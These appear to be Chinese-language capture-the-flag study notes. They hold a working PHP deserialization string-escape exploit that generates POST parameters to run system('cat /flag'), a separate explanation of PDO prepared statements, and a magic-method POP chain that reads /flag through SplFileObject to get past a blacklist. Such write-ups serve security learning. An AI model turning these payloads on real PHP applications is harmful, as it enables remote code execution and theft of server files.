```
<?php
// 1. 复用目标系统中的类结构（反序列化必须依赖这些类的定义）
class LogService {
    protected $handler;
    protected $formatter;
    public function __construct($h = null) {
        $this->handler = $h; // 接收FileStream实例
        $this->formatter = new DateFormatter();
    }
}
class FileStream {
    private $path;
    private $mode;
    public $content; 
    public function __construct($p, $m) {
        $this->path = $p;
        $this->mode = $m; // 需设为'debug'才能触发eval
    }
}
class DateFormatter {} // 空类，仅为满足实例化要求

// 2. 构造恶意FileStream实例（代码执行的核心）
$f = new FileStream('exploit.log', 'debug'); // mode设为'debug'（满足close()执行条件）
$f->content = 'system("cat /flag");'; // 要执行的恶意命令：读取/flag文件

// 3. 构造LogService实例（触发FileStream::close()的桥梁）
$l = new LogService($f); // 把恶意FileStream赋值给handler属性

// 4. 序列化恶意LogService实例，得到恶意序列化字符串
$bad = serialize($l);

// 5. 核心：构造绕过防护的POST参数（最关键的部分）
for ($i = 0; $i < 2000; $i++) {
    // 生成i个"A"作为填充字符（用于对齐序列化字符串结构）
    $pad = str_repeat("A", $i);
    
    // 构造bio参数：拼接填充字符 + 篡改preference属性的序列化片段 + 恶意序列化字符串 + 闭合符
    // 目的：把UserProfile的preference属性从DateFormatter替换为恶意LogService
    $bio = $pad . '";s:10:"preference";' . $bad . ';}';
    
    // 构造eat变量：匹配UserProfile序列化字符串的结构，计算bio的长度并填充
    // 格式对应：";s:3:"bio";s:【bio长度】:"【填充字符】
    $eat = '";s:3:"bio";s:' . strlen($bio) . ':"' . $pad;
    
    // 关键判断：eat的长度必须是6的倍数（因为"hacker"长度=6）
    if (strlen($eat) % 6 === 0) {
        // 构造user参数：用多个"hacker"拼接（长度=eat的长度）
        // 目标代码的DataSanitizer::clean()会把"hacker"替换为空，替换后刚好清空这部分，不破坏序列化结构
        $user = str_repeat("hacker", strlen($eat) / 6);
        
        // 输出可直接提交的POST参数（urlencode处理bio避免特殊字符问题）
        echo "user=" . $user . "&bio=" . urlencode($bio);
        break; // 找到符合条件的长度后退出循环
    }
}
?>
```

目标页面执行流程：

- `SecurityProvider`验证：参数中无`..`，通过；
- 创建`UserProfile`实例并序列化；
- `DataSanitizer::clean()`把 user 中的 "hacker" 替换为空，序列化字符串结构仍完整；
- 反序列化`$safe_data`：此时 UserProfile 的`preference`已被替换为恶意 LogService 实例；
- 脚本执行结束，LogService 对象销毁，触发`__destruct()`方法，调用`handler->close()`；
- FileStream 的`close()`方法执行`eval($content)`，最终执行`system("cat /flag")`，读取 /flag 文件。

$stmt = $pdo->prepare("CALL buy_item(?, ?)");

- $pdo：是 PHP 连接数据库的 PDO 实例（已提前完成数据库连接）；

- prepare()：预处理方法，作用是把 “调用存储过程 buy_item” 的 SQL 语句发送给数据库编译，提升执行效率（多次调用时更明显），同时防止 SQL 注入；

- `CALL buy_item(?, ?)`：SQL 语法，调用名为 `buy_item` 的存储过程，`?` 是参数占位符（第一个对应商品 ID，第二个对应金额）。

  

$stmt->execute([$target_id, $my_money]);

- execute()：执行预处理好的语句；

- 传入的数组 [$target_id, $my_money] 会按顺序替换 

  prepare 中的两个 ?：

  - 第一个 ? → $target_id（商品 ID）；
  - 第二个 ? → $my_money（用户当前金额）；

- 这一步是真正触发数据库执行 buy_item 存储过程的操作。

  

$res = $stmt->fetch();

- `fetch()`：从执行结果集中获取**一行数据**（存储过程 `buy_item` 执行后通常会返回结果，比如购买是否成功、剩余金额、商品信息等）；
- $res 最终是一个数组（默认是关联 + 索引数组），比如 ['status' => 1, 'remain_money' => 50]，具体结构由 buy_item 存储过程的返回值决定。

1. **起点**：`Sun` 类在销毁时触发 `__destruct`。
   1. `$sun = new Sun();`
   2. `$sun->sun = $moon;` (触发 `Moon::__toString`)
2. **跳板 1**：`Moon` 类转换为字符串。
   1. `$moon = new Moon();`
   2. `$moon->nearside = $earth;` (触发 `Earth::__invoke`)
3. **跳板 2**：`Earth` 类被当作函数调用。
   1. `$earth = new Earth();`
   2. `$earth->onearth = $solar1;` (目标对象)
   3. `$earth->inearth = "AnyProp";` (不存在的属性名，用于触发 `__set`)
   4. `$earth->outofearth = "/flag";` (我们要读取的文件名，将作为值传递给 `__set`)
4. **跳板 3**：`Solar` 类处理属性赋值触发 `__set`。
   1. `$solar1 = new Solar();`
   2. `$solar1->Mercury = $solar2;` (下一个 Solar 对象，用于触发 `__call`)
   3. `$solar1->Venus = "SplFileObject";` (方法名)
   4. 逻辑解释：`Solar::__set` 执行 `$this->Mercury->{$this->Venus}($key)`。即 `$solar2->SplFileObject("/flag")`。
   5. 由于 `Solar` 类没有 `SplFileObject` 方法，触发 `solar2` 的 `__call`。
5. **终点**：`Solar::__call` 实例化类并利用。
   1. `$solar2 = new Solar();`
   2. `$func` 接收到的方法名是 `SplFileObject`。
   3. `$args[0]` 接收到的参数是 `/flag`。
   4. 实例化：`$exploar = new SplFileObject("/flag");` (绕过了黑名单，完全合法)
